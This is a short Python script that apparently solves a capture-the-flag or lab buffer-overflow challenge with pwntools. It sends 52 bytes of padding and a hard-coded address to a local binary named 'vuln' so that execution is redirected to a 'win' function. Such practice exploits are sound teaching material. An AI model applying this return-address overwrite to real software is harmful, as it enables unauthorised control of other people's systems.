from pwn import *

p=process('./vuln')

payload='A'*52 #offset --> padding of 52
payload+='\x01\x03\x91\xc3' # Address of win function

p.clean() #receive all the text
p.sendline(payload)

log.info(p.clean()) #Output
